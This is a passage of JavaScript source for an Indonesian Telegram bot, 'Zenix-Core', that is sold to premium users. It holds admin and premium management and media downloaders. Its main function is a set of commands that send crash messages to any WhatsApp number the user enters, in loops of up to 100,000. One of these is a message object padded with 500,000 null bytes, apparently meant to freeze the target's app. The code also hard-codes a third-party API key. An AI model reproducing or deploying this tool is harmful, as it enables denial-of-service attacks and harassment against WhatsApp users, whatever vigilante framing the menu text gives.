      return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
  }

  let userId;

  if (ctx.message.reply_to_message) {
      userId = ctx.message.reply_to_message.from.id.toString();
  } else {
      const args = ctx.message.text.split(" ")[1];
      if (!args) {
          return await ctx.reply(`❌ Format perintah salah. Gunakan: /deladmin <id>`);
      }

      if (args.startsWith("@")) {
          try {
              const username = args.slice(1);
              const chatMember = await ctx.telegram.getChatMember(ctx.chat.id, `@${username}`);
              userId = chatMember.user.id.toString();
          } catch (error) {
              return await ctx.reply("❌ Username tidak ditemukan atau bukan member dari grup ini.");
          }
      } else {
          if (!/^\d+$/.test(args)) {
              return await ctx.reply("❌ ID harus berupa angka!");
          }
          userId = args;
      }
  }

  if (!adminList.includes(userId)) {
      return await ctx.reply(`❌ User dengan ID ${userId} tidak terdaftar sebagai admin.`);
  }

  try {
      const user = await ctx.telegram.getChat(userId);
      removeAdmin(userId);

      const successMessage = `
╭──「  𝗗𝗘𝗟𝗘𝗧𝗘 𝗔𝗗𝗠𝗜𝗡 」
┃
┃ ✅ BERHASIL MENGHAPUS ADMIN
┃ 𝗗𝗲𝘁𝗮𝗶𝗹 𝗨𝘀𝗲𝗿:
┃ • ID: ${userId}
┃ • Username: ${user.username ? '@' + user.username : 'Tidak ada'}
┃ • Nama: ${user.first_name}${user.last_name ? ' ' + user.last_name : ''}
╰─────────────────❍`;

      await ctx.replyWithMarkdown(successMessage, {
          reply_markup: {
              inline_keyboard: [
                  [{ text: "📋 List Admin", callback_data: "listadmin" }],
                  [{ text: "❌ Close", callback_data: "close" }]
              ]
          }
      });
  } catch (error) {
      console.error('Error removing admin:', error);
      await ctx.reply("❌ Gagal menghapus admin. Pastikan ID/Username valid.");
  }
});

// Delete Owner Command
bot.command("delowner", async (ctx) => {
  if (!OWNER_ID(ctx.from.id)) {
      return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
  }

  let userId;

  if (ctx.message.reply_to_message) {
      userId = ctx.message.reply_to_message.from.id.toString();
  } else {
      const args = ctx.message.text.split(" ")[1];
      if (!args) {
          return await ctx.reply(`❌ Format perintah salah. Gunakan: /delowner <id>`);
      }

      if (args.startsWith("@")) {
          try {
              const username = args.slice(1);
              const chatMember = await ctx.telegram.getChatMember(ctx.chat.id, `@${username}`);
              userId = chatMember.user.id.toString();
          } catch (error) {
              return await ctx.reply("❌ Username tidak ditemukan atau bukan member dari grup ini.");
          }
      } else {
          if (!/^\d+$/.test(args)) {
              return await ctx.reply("❌ ID harus berupa angka!");
          }
          userId = args;
      }
  }

  if (!ownerList.includes(userId)) {
      return await ctx.reply(`❌ User dengan ID ${userId} tidak terdaftar sebagai owner.`);
  }

  try {
      const user = await ctx.telegram.getChat(userId);
      ownerList = ownerList.filter(id => id !== userId);
      await saveOwnerList();

      const successMessage = `
╭──「  𝗗𝗘𝗟𝗘𝗧𝗘 𝗢𝗪𝗡𝗘𝗥 」
┃
┃ ✅ BERHASIL DELETE OWNER 
┃ 𝗗𝗲𝘁𝗮𝗶𝗹 𝗨𝘀𝗲𝗿:
┃ • ID: ${userId}
┃ • Username: ${user.username ? '@' + user.username : 'Tidak ada'}
┃ • Nama: ${user.first_name}${user.last_name ? ' ' + user.last_name : ''}
╰─────────────────❍`;

      await ctx.replyWithMarkdown(successMessage, {
          reply_markup: {
              inline_keyboard: [
                  [{ text: "📋 List Owner", callback_data: "listowner" }],
                  [{ text: "❌ Close", callback_data: "close" }]
              ]
          }
      });
  } catch (error) {
      console.error('Error removing owner:', error);
      await ctx.reply("❌ Gagal menghapus owner. Pastikan ID/Username valid.");
  }
});

// Handler untuk callback listadmin
bot.action("listadmin", async (ctx) => {
  try {
      let adminText = "╭═══❲ 𝗟𝗜𝗦𝗧 𝗔𝗗𝗠𝗜𝗡 ❳═══⊱\n┃\n";
      
      for (const adminId of adminList) {
          try {
              const user = await ctx.telegram.getChat(adminId);
              adminText += `┃ • ${user.first_name}${user.last_name ? ' ' + user.last_name : ''}\n`;
              adminText += `┃   ID: ${adminId}\n`;
              if (user.username) adminText += `┃   Username: @${user.username}\n`;
              adminText += "┃\n";
          } catch (error) {
              adminText += `┃ • ID: ${adminId} (User tidak ditemukan)\n┃\n`;
          }
      }
      
      adminText += `┃ Total: ${adminList.length} admin\n`;
      adminText += "┗━━━━━━━━━━━━━━━━━━━━";

      await ctx.editMessageText(adminText, {
          reply_markup: {
              inline_keyboard: [[{ text: "❌ Close", callback_data: "close" }]]
          }
      });
  } catch (error) {
      console.error('Error displaying admin list:', error);
      await ctx.answerCallbackQuery("❌ Gagal menampilkan daftar admin.");
  }
});

// Command /addprem - Menambahkan user premium
bot.command("addprem", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id) && !isAdmin(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const args = ctx.message.text.split(" ");
    let userId;
    let durationDays;

    // Parse durasi dari argument terakhir
    durationDays = parseInt(args[args.length - 1]);
    if (isNaN(durationDays) || durationDays <= 0) {
        return await ctx.reply(`❌ Format perintah salah. Gunakan: /addprem <id_days>`);
    }

    // Jika command merupakan reply ke pesan
    if (ctx.message.reply_to_message) {
        userId = ctx.message.reply_to_message.from.id.toString();
    } 
    // Jika ada username/mention atau ID yang diberikan
    else if (args.length >= 3) {
        const userArg = args[1];
        
        // Jika input adalah username (dimulai dengan @)
        if (userArg.startsWith("@")) {
            try {
                const username = userArg.slice(1);
                const chatMember = await ctx.telegram.getChatMember(ctx.chat.id, `@${username}`);
                userId = chatMember.user.id.toString();
            } catch (error) {
                console.log("Error getting user by username:", error);
                userId = null;
            }
        } 
        // Jika input adalah ID langsung
        else {
            userId = userArg.toString();
        }
    }

    if (!userId) {
        return await ctx.reply("❌ Tidak dapat menemukan user. Pastikan ID/Username valid.");
    }

    try {
        // Tambahkan user ke premium
        addPremiumUser(userId, durationDays);

        const expirationDate = premiumUsers[userId].expired;
        const formattedExpiration = moment(expirationDate, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta').format('DD-MM-YYYY HH:mm:ss');

        const successMessage = `
╭──「  𝗔𝗗𝗗 𝗣𝗥𝗘𝗠 」
┃
┃ ✅ BERHASIL MENAMBAH PREM
┃ 𝗗𝗲𝘁𝗮𝗶𝗹 𝗣𝗿𝗲𝗺𝗶𝘂𝗺:
┃ • ID: ${userId}
┃ • Durasi: ${durationDays} hari
┃ • Expired: ${formattedExpiration} WIB
╰─────────────────❍`;

        await ctx.replyWithMarkdown(successMessage, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: "📋 List Premium", callback_data: "listprem" }],
                    [{ text: "🔍 Cek Status", callback_data: `cekprem_${userId}` }],
                    [{ text: "❌ Close", callback_data: "close" }]
                ]
            }
        });

    } catch (error) {
        console.error('Error adding premium:', error);
        await ctx.reply("❌ Gagal menambahkan premium. Silakan coba lagi.");
    }
});

// Handler untuk callback listprem
bot.action("listprem", async (ctx) => {
  try {
      let premText = `╭═══❲ 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗟𝗜𝗦𝗧 ❳═══⊱\n┃\n`;
      
      for (const [userId, userData] of Object.entries(premiumUsers)) {
          try {
              const user = await ctx.telegram.getChat(userId);
              const expiry = moment(userData.expired).tz('Asia/Jakarta');
              const timeLeft = expiry.fromNow();
              
              premText += `┃ ⬡ ${user.first_name}\n`;
              premText += `┃    ${timeLeft}\n`;
          } catch (error) {
              premText += `┃ ⬡ Unknown User\n`;
              premText += `┃    ID: ${userId}\n`;
          }
      }
      
      premText += `┃\n┃ Total: ${Object.keys(premiumUsers).length} Premium\n`;
      premText += `╰═════════════════⊱\n`;
      premText += `           *GIO XCRASH V2.0 DEV @dhlaacuj*`;

      await ctx.editMessageText(premText, {
          parse_mode: "Markdown",
          reply_markup: {
              inline_keyboard: [
                  [{ text: "〆 Close", callback_data: "close" }]
              ]
          }
      });
  } catch (error) {
      console.error('Error displaying premium list:', error);
      await ctx.answerCallbackQuery("❌ Gagal menampilkan daftar premium.");
  }
});



// Callback Query untuk Menampilkan Status Premium
bot.action(/cekprem_(.+)/, async (ctx) => {
    const userId = ctx.match[1];
    if (userId !== ctx.from.id.toString() && !OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id) && !isAdmin(ctx.from.id)) {
        return await ctx.answerCbQuery("❌ Anda tidak memiliki akses untuk mengecek status premium user lain.");
    }

    if (!premiumUsers[userId]) {
        return await ctx.answerCbQuery(`❌ User dengan ID ${userId} tidak terdaftar sebagai user premium.`);
    }

    const expirationDate = premiumUsers[userId].expired;
    const formattedExpiration = moment(expirationDate, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta').format('DD-MM-YYYY HH:mm:ss');
    const timeLeft = moment(expirationDate, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta').fromNow();

    const message = `
ℹ️ Status Premium User *${userId}*

*Detail:*
- *ID User:* ${userId}
- *Kadaluarsa:* ${formattedExpiration} WIB
- *Sisa Waktu:* ${timeLeft}

Terima kasih telah menjadi bagian dari komunitas premium kami!
    `;

    await ctx.answerCbQuery();
    await ctx.replyWithMarkdown(message);
});

// --- Command /cekusersc ---
bot.command("cekusersc", async (ctx) => {
    const totalDevices = deviceList.length;
    const deviceMessage = `
ℹ️ Saat ini terdapat *${totalDevices} device* yang terhubung dengan script ini.
    `;

    await ctx.replyWithMarkdown(deviceMessage);
});

// --- Command /monitoruser ---
bot.command("monitoruser", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    let userList = "";
    for (const userId in userActivity) {
        const user = userActivity[userId];
        userList += `
- *ID:* ${userId}
 *Nickname:* ${user.nickname}
 *Terakhir Dilihat:* ${user.last_seen}
`;
    }

    const message = `
👤 *Daftar Pengguna Bot:*
${userList}
Total Pengguna: ${Object.keys(userActivity).length}
    `;

    await ctx.replyWithMarkdown(message);
});

const prosesrespone = async (target, ctx) => {
  const caption = `
━━━━━━━━━━━━━━━━━━━━❍
𖦲『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 』𖦲 

=𝐆𝐄𝐓 :wa.me/${target.split("@")[0]}
━━━━━━━━━━━━━━━━━━━━❍
 `;

  try {
      await ctx.replyWithVideo("https://files.catbox.moe/eeoht4.mp4", {
          caption: caption,
          parse_mode: "Markdown"
      });
      console.log(chalk.blue.bold(`[✓] Process attack target: ${target}`));
  } catch (error) {
      console.error(chalk.red.bold('[!] Error sending process response:', error));
      // Fallback to text-only message if image fails
      await ctx.reply(caption, { parse_mode: "Markdown" });
  }
};

const donerespone = async (target, ctx) => {
  // Get random hexcolor for timestamp
  const hexColor = '#' + Math.floor(Math.random()*16777215).toString(16);
  const timestamp = moment().format('HH:mm:ss');
  
  try {
    // Fetch kata ilham dari API
    const response = await axios.get('https://api.betabotz.eu.org/api/random/katailham?apikey=Btz-kp72a');
    const kataIlham = response.data.hasil;
 
    const caption = `
━━━━━━━━━━━━━━━━━━━━❍
𖦲『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』𖦲 

𝐓𝐀𝐑𝐆𝐄𝐓 :wa.me/${target.split("@")[0]}
━━━━━━━━━━━━━━━━━━━━❍   
`;
 
    await ctx.replyWithVideo("https://files.catbox.moe/6dgtd0.mp4", {
        caption: caption,
        parse_mode: "Markdown",
        reply_markup: {
            inline_keyboard: [
                [{ text: "〆 Close", callback_data: "close" }]
            ]
        }
    });
    console.log(chalk.green.bold(`[✓] Attack in succes target: ${target}`));
  } catch (error) {
      console.error(chalk.red.bold('[!] Error:', error));
      // Fallback message tanpa quotes jika API error
      const fallbackCaption = `
━━━━━━━━━━━━━━━━━━━━❍
𖦲『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』𖦲 

𝐓𝐀𝐑𝐆𝐄𝐓 :wa.me/${target.split("@")[0]}
━━━━━━━━━━━━━━━━━━━━❍   
`; 
 
      await ctx.reply(fallbackCaption, {
          parse_mode: "Markdown",
          reply_markup: {
              inline_keyboard: [
                  [{ text: "〆 Close", callback_data: "close" }]
              ]
          }
      });
  }
 };

const checkWhatsAppConnection = async (ctx, next) => {
    if (!isWhatsAppConnected) {
        await ctx.reply("❌ WhatsApp belum terhubung. Silakan gunakan command /addpairing");
        return;
    }
    await next();
};

const QBug = {
  key: {
    remoteJid: "p",
    fromMe: false,
    participant: "0@s.whatsapp.net"
  },
  message: {
    interactiveResponseMessage: {
      body: {
        text: "Sent",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\0".repeat(500000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
        version: 3
      }
    }
  }
};


bot.command("soundcloud", async (ctx) => {
    const text = ctx.message.text;
    const args = text.split(" ");
  
    if (args.length < 2) {
      return ctx.reply(`
  ❌ Format perintah salah. Gunakan: /soundcloud <>`);
    }
  
    const url = args[1];
    const apiUrl = `https://api.betabotz.eu.org/api/download/soundcloud?url=${url}&apikey=Btz-kp72a`;
  
    await ctx.reply(`
  ╭──「 𝗣𝗥𝗢𝗦𝗘𝗦 」
  ┃ ⏳ MENGUNDUH !
  ┃ 𝗨𝗿𝗹: ${url}
  ╰─────────────────❍`);
  
    try {
      const response = await axios.get(apiUrl);
      const data = response.data;
  
      if (data.status && data.result) {
        const audioUrl = data.result.url;
        const title = data.result.title;
        const thumbnail = data.result.thumbnail || "https://img1.pixhost.to/images/6514/611451276_kurosay.jpg";
  
        // Kirim thumbnail dengan audio
        await ctx.replyWithPhoto(thumbnail, {
          caption: `
  ╭──「 𝗦𝗢𝗨𝗡𝗗𝗖𝗟𝗢𝗨𝗗 」
  ┃ ✅ BERHASIL 
  ┃ 𝗝𝘂𝗱𝘂𝗹: ${title}
  ╰─────────────────❍`,
          parse_mode: "Markdown"
        });
  
        // Kirim audio
        await ctx.replyWithAudio(audioUrl, {
          title: title,
          performer: "Gio Downloader",
          thumb: thumbnail
        });
  
      } else {
        ctx.reply(`
  ╭──「 𝗘𝗥𝗥𝗢𝗥 」
  ┃ ❌ GAGAL
  ┃ 𝗜𝗻𝗳𝗼: URL tidak valid
  ╰─────────────────❍`);
      }
    } catch (error) {
      console.error(error);
      ctx.reply(`
  ╭──「 𝗘𝗥𝗥𝗢𝗥 」
  ┃ ❌ TERJADI KESALAHAN 
  ┃ 𝗜𝗻𝗳𝗼: Coba Lagi Nanti 
  ╰─────────────────❍`);
    }
  });

bot.command("tiktokmp3", async (ctx) => {
  const text = ctx.message.text;
  const args = text.split(" ");

  if (args.length < 2) {
    return ctx.reply(`
  ❌ Format perintah salah. Gunakan: /tiktokmp3 <url_tiktok>`);
  }

  const videoUrl = args[1];
  const apiUrl = `https://api.betabotz.eu.org/api/download/tiktok?url=${videoUrl}&apikey=Btz-kp72a`;

  await ctx.reply(`
╭──「 𝗣𝗥𝗢𝗦𝗘𝗦 」
┃ ⏳ Mengunduh audio...
┃ 𝗨𝗿𝗹: ${videoUrl}
╰─────────────────❍`);

  try {
    const response = await axios.get(apiUrl);
    const data = response.data;

    if (data.status) {
      const audioUrl = data.result.audio[0];
      const title = data.result.title;

      await ctx.replyWithAudio(audioUrl, {
        caption: `
╭═══[ 𝗧𝗜𝗞𝗧𝗢𝗞 𝗔𝗨𝗗𝗜𝗢 ]═══⊱
┃
┃ ✅ Berhasil diunduh! 
┃ 𝗝𝘂𝗱𝘂𝗹: ${title}
╰─────────────────❍`,
        title: `${title}.mp3`,
        parse_mode: "Markdown"
      });

    } else {
      ctx.reply(`
╭──「 𝗘𝗥𝗥𝗢𝗥 」
┃ ❌ GAGAL
┃ 𝗜𝗻𝗳𝗼: URL tidak valid
╰─────────────────❍`);
    }
  } catch (error) {
    console.error(error);
    ctx.reply(`
╭──「 𝗘𝗥𝗥𝗢𝗥 」
┃ ❌ TERJADI KESALAHAN 
┃ 𝗜𝗻𝗳𝗼: Coba Lagi Nanti 
╰─────────────────❍`);
  }
});

bot.command("tiktokmp4", async (ctx) => {
  const text = ctx.message.text;
  const args = text.split(" ");

  if (args.length < 2) {
      return await ctx.reply(`
  ❌ Format perintah salah. Gunakan: /tiktokmp4 <url_tiktok>`);
  }

  const videoUrl = args[1];
  const apiUrl = `https://api.betabotz.eu.org/api/download/tiktok?url=${videoUrl}&apikey=Btz-kp72a`;

  await ctx.reply(`
╭──「 𝗣𝗥𝗢𝗦𝗘𝗦 」
┃ ⏳ Mengunduh video...
┃ 𝗨𝗿𝗹: ${videoUrl}
╰─────────────────❍`);

  try {
    const response = await axios.get(apiUrl);
    const data = response.data;

    if (data.status && data.result.video && data.result.video[0]) {
      const videoUrl = data.result.video[0];
      const title = data.result.title;

      // Hilangkan karakter khusus dan emoji dari judul
      const cleanTitle = title.replace(/[^\w\s-]/g, '');

      await ctx.replyWithVideo(videoUrl, {
        caption: `╭═══[ 𝗧𝗜𝗞𝗧𝗢𝗞 𝗩𝗜𝗗𝗘𝗢 ]═══⊱\n┃\n┃ ✅ Berhasil diunduh!\n┃ \n┃ 𝗝𝘂𝗱𝘂𝗹: ${cleanTitle}\n┃\n╰═════════════════⊱`,
        parse_mode: undefined // Hapus parse_mode
      });

    } else {
      ctx.reply(`
╭──「 𝗘𝗥𝗥𝗢𝗥 」
┃ ❌ GAGAL
┃ 𝗜𝗻𝗳𝗼: URL tidak valid
╰─────────────────❍`);
    }
  } catch (error) {
    console.error('Error downloading video:', error);
    ctx.reply(`
╭──「 𝗘𝗥𝗥𝗢𝗥 」
┃ ❌ TERJADI KESALAHAN 
┃ 𝗜𝗻𝗳𝗼: Coba Lagi Nanti 
╰─────────────────❍`);
  }
});




// --- Command /crash (Placeholder for your actual crash functions) ---

bot.command("xrip", checkWhatsAppConnection, checkPremium, async ctx => {
  const q = ctx.message.text.split(" ")[1];

  if (!q) {
      return await ctx.reply(`Example /xrip 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  await prosesrespone(target, ctx);

  try {
      for (let i = 0; i < 1; i++) {
          await CursorBynando(target);

     await isagicombofc(target);
        
          
          console.log(chalk.green.bold(`[✓] Sent Bug Delay ${i+1}/1 to ${target}`));
      }

      await donerespone(target, ctx);
  } catch (error) {
      console.error(chalk.red.bold(`[!] Error in ios:`, error));
      await ctx.reply("❌ Terjadi error saat mengirim bug.");
  }
});

  

bot.command("xkros", checkWhatsAppConnection, checkPremium, async ctx => {
  const q = ctx.message.text.split(" ")[1];

  if (!q) {
      return await ctx.reply(`Example: /xkros 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  await prosesrespone(target, ctx);

  for (let i = 0; i < 100; i++) {
    await robustfreeze(target);
    await protocolbug6(target);
    await protocol7(target);
    
}
  await donerespone(target, ctx);
});

bot.command("xui", checkWhatsAppConnection, checkPremium, async ctx => {
  const q = ctx.message.text.split(" ")[1];

  if (!q) {
      return await ctx.reply(`Example /xui 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  await prosesrespone(target, ctx);

  try {
      for (let i = 0; i < 200; i++) {
          await robustfreeze(target);
          
          console.log(chalk.green.bold(`[✓] Sent Bug ui ${i+1}/200 to ${target}`));
      }

      await donerespone(target, ctx);
  } catch (error) {
      console.error(chalk.red.bold(`[!] Error in ios:`, error));
      await ctx.reply("❌ Terjadi error saat mengirim bug.");
  }
});

bot.command("p", checkWhatsAppConnection, checkPremium, async ctx => {
  const q = ctx.message.text.split(" ")[1];

  if (!q) {
      return await ctx.reply(`Example: /sistemui 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  await prosesrespone(target, ctx);

  for (let i = 0; i < 50; i++) {
    await NewAmpas2(target);
    
}

  await donerespone(target, ctx);
});

bot.command("xbul", checkWhatsAppConnection, checkPremium, async ctx => {
  const q = ctx.message.text.split(" ")[1];

  if (!q) {
      return await ctx.reply(`Example: /xbul 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  await prosesrespone(target, ctx);

  for (let i = 0; i < 100000; i++) {
  await bulldozer(target);
}

  await donerespone(target, ctx);
});



bot.command("combo", checkWhatsAppConnection, checkPremium, async ctx => {
  const q = ctx.message.text.split(" ")[1];

  if (!q) {
      return await ctx.reply(`Example: /combo 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  await prosesrespone(target, ctx);

  for (let i = 0; i < 1; i++) {
  
}
  await donerespone(target, ctx);
});

bot.command("xstrom", checkWhatsAppConnection, checkPremium, async ctx => {
  const q = ctx.message.text.split(" ")[1];

  if (!q) {
      return await ctx.reply(`Example /xstrom 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  await prosesrespone(target, ctx);

  for (let i = 0; i < 1; i++) {
    await zenix2(target);
    await zenix3(target);
    
}
  await donerespone(target, ctx);
});



bot.command("xhard", checkWhatsAppConnection, checkPremium, async ctx => {
  const q = ctx.message.text.split(" ")[1];

  if (!q) {
      return await ctx.reply(`Example /xhard 628xxxxxx`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  await prosesrespone(target, ctx);

  for (let i = 0; i < 100; i++) {
    await zenix2(target);
     await zenix3(target);
      await protocol7(target, true);
      await protocolbug6(target, true);
      await bulldozer(target, true);
      await bulldozer(target, true);
      await zenix2(target);
      await zenix3(target);
      await protocol7(target, true);
    
}
  await donerespone(target, ctx);
});

bot.start(async (ctx) => {
  await ctx.telegram.sendChatAction(ctx.chat.id, 'typing');

  const isPremium = isPremiumUser(ctx.from.id);
  const isAdminStatus = isAdmin(ctx.from.id);
  const isOwnerStatus = isOwner(ctx.from.id);

  const mainMenuMessage = `
🌸 *Z E N I X - C O R E* 🌸
「 このスクリプトは正義と反撃のために設計された 」  
─────────────────────
🧑‍💻 *ᴅᴇᴠᴇʟᴏᴘᴇʀ* : ${global.dev}
📱 *ᴄᴏɴᴛᴀᴄᴛ ᴍᴇ* : ${owner}
📺 *ᴍʏ ᴄʜᴀɴɴᴇʟ* : ${ch}
🧩 *ᴠᴇʀsɪᴏɴ* : ${ver}
⏱ *ᴜᴘᴛɪᴍᴇ* : ${Math.floor(process.uptime())} 秒
─────────────────────
👑 *ᴏᴡɴᴇʀ* : ${isOwnerStatus ? '✅' : '❌'}
🛡️ *ᴀᴅᴍɪɴ* : ${isAdminStatus ? '✅' : '❌'}
💎 *ᴘʀᴇᴍɪᴜᴍ* : ${isPremium ? '✅' : '❌'}
─────────────────────
⚠️ _Script ini hanya untuk membuat ripper/penipu kena mental._
🛑 Jangan digunakan untuk balas dendam atau tindakan kriminal.

📖 *QS Asy-Syura (42):40*
> وَجَزَٰٓؤُا۟ سَيِّئَةٍۢ سَيِّئَةٌۭ مِّثْلُهَا ۖ فَمَنْ عَفَا وَأَصْلَحَ فَأَجْرُهُۥ عَلَى ٱللَّهِ ۚ

"Balasan kejahatan adalah kejahatan yang setimpal. Namun siapa yang memaafkan & memperbaiki, pahalanya dari Allah."
─────────────────────
🎌 _ようこそ、Zenixの世界へ…_ 🚨
`;

  const mainKeyboard = [
    [{
      text: "🛠️ 武器(ᴅᴇᴠ ᴍᴇɴᴜ)",
      callback_data: "developercmd"
    },
    {
      text: "💥 バグ(ʙᴜɢ ᴍᴇɴᴜ)",
      callback_data: "bugmenu"
    },
    {
      text: "🤝 支(ᴛǫᴛᴏ)",
      callback_data: "tqto"
    },
    {
      text: "📂 記録(ɴᴏᴛᴇ)",
      callback_data: "note"
    }],
    [{
      text: "📡 HQチャンネルをフォローする",
      url: "https://whatsapp.com/channel/0029VbAk1E0DDmFRUcfGbk1i"
    }]
  ];

  // Kirim video dan audio dengan delay agar smooth
  setTimeout(async () => {
    await ctx.replyWithPhoto("https://files.catbox.moe/unz912.jpg", {
      caption: mainMenuMessage,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: mainKeyboard
      }
    });

    await ctx.replyWithAudio("https://files.catbox.moe/ba2kaa.mp3", {
      title: "起動音 - Boot Sound",
      performer: "ZENIX SYSTEM"
    });
  }, 1000);
});

// note
bot.action('note', async (ctx) => {
await ctx.deleteMessage();
     const mainMenuMessage = `
ᴍᴏʜᴏɴ ᴊᴀɴɢᴀɴ ᴅɪ ᴅᴇᴄᴏᴅᴇ/ᴄʀᴀᴄᴋ ʜᴀʀɢᴀɪ ᴅᴇᴠᴇʟᴏᴘᴇʀ, ʙᴏʟᴇʜ ᴘᴀᴋᴇ ᴛᴀᴘɪ ᴊᴀɴɢᴀɴ ᴅɪ ᴅᴇᴄᴏᴅᴇ/ᴄʀᴀᴄᴋ 🙏

📖 QS. Al-Isra’ (17): 33

Larangan merampas kehidupan orang lain

وَلَا تَقۡتُلُواْ ٱلنَّفۡسَ ٱلَّتِي حَرَّمَ ٱللَّهُ إِلَّا بِٱلۡحَقِّ...

Artinya:

Dan janganlah kamu membunuh jiwa yang diharamkan Allah, kecuali dengan alasan yang benar...
─────────────────────
🎌 _ようこそ、Zenixの世界へ…_ 🚨
`;

const mainKeyboard = [
      [{ text: "🔚 𝙱𝙰𝙲𝙺 𝙼𝙴𝙽𝚄", callback_data: "main_menu" }]
    ];
  
    await ctx.replyWithVideo("https://files.catbox.moe/eeoht4.mp4", {
      caption: mainMenuMessage,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: mainKeyboard
      }
    });
});

// tqto
bot.action('tqto', async (ctx) => {
await ctx.deleteMessage();
  const mainMenuMessage = `
🙏 *T Q T O - 感謝の言葉*
「 支援してくれた皆さまに心からの感謝を 」
─────────────────────
🕌 *Allah SWT*
🧠 *Nando (Developer Isagi)*
🫂 *Kyanzz(Best Friend)*
👥 *Seluruh Pengguna*
💸 *Semua Pembeli dan Supporter*
─────────────────────
📖 *QS. Ali 'Imran: 134*
_"Sesungguhnya Allah mencintai orang-orang yang berbuat kebaikan."_
─────────────────────
💬 *Jazakumullahu khairan atas semua dukungan kalian. Semoga dibalas dengan kebaikan berlipat oleh Allah.*
─────────────────────
🎌 _ようこそ、Zenixの世界へ…_ 🚨
`;

  const mainKeyboard = [
    [{ text: "🔙 戻る (Main Menu)", callback_data: "main_menu" }]
  ];

  await ctx.replyWithVideo("https://files.catbox.moe/eeoht4.mp4", {
    caption: mainMenuMessage,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: mainKeyboard
    }
  });
});

bot.action('downloadermenu', async (ctx) => {
    const mainMenuMessage = `  
┏━━ 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃 ━━❍
┃⊱ /tiktokmp3 <link>
┃⊱ /tiktokmp4 <link>
┃⊱ /soundcloud <link>
┗━━━━━━━━━━━━━━❍
 `;
  
    const mainKeyboard = [
      [{ text: "🔚 𝙱𝙰𝙲𝙺 𝙼𝙴𝙽𝚄", callback_data: "main_menu" }]
    ];
  
    await ctx.replyWithVideo("https://files.catbox.moe/eeoht4.mp4", {
      caption: mainMenuMessage,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: mainKeyboard
      }
    });
});

// Handler untuk callback "owner_management"
bot.action('developercmd', async (ctx) => {
await ctx.deleteMessage();
  const isPremium = isPremiumUser(ctx.from.id);
  const isAdminStatus = isAdmin(ctx.from.id);
  const isOwnerStatus = isOwner(ctx.from.id);

  const mainMenuMessage = `
🛠️ *Z E N I X - D E V  M O D E*
「 管理操作パネル - Admin Control Center 」
─────────────────────
👑 *OWNER*   : ${isOwnerStatus ? '✅' : '❌'}
🛡️ *ADMIN*   : ${isAdminStatus ? '✅' : '❌'}
💎 *PREMIUM* : ${isPremium ? '✅' : '❌'}
🤖 *BOTNAME* : ${BOT}
─────────────────────
📘 *Owner Commands:*
🆔 /info — Info sistem bot
🔗 /addpairing <628xxx>
⏱ /setjeda <detik> <durasi>
👑 /addowner <id>
❌ /delowner <id>
🛡️ /addadmin <id>
❌ /deladmin <id>
💎 /addprem <id>
❌ /delprem <id>
─────────────────────
⚠️ *Gunakan menu ini hanya oleh pemilik resmi*
`;

  const mainKeyboard = [
    [
      { text: "🔄 リフレッシュ (Refresh)", callback_data: "developercmd" },
      { text: "🔙 戻る (Main Menu)", callback_data: "main_menu" }
    ]
  ];

  await ctx.replyWithVideo("https://files.catbox.moe/eeoht4.mp4", {
    caption: mainMenuMessage,
    parse_mode: "Markdown",
    reply_markup: { inline_keyboard: mainKeyboard }
  });
});

bot.action('adminmenu', async (ctx) => {
  // Hapus pesan menu own
  const isPremium = isPremiumUser(ctx.from.id);
  const isAdminStatus = isAdmin(ctx.from.id);
  const isOwnerStatus = isOwner(ctx.from.id);
  // Kirim ulang menu utama (Anda dapat menggunakan kode yang sama seperti pada bot.start)
  const mainMenuMessage = `
┏━━ 𝐀𝐃𝐌𝐈𝐍 𝐌𝐄𝐍𝐔 ━━❍
┃⊱ /addprem <ɪᴅ>
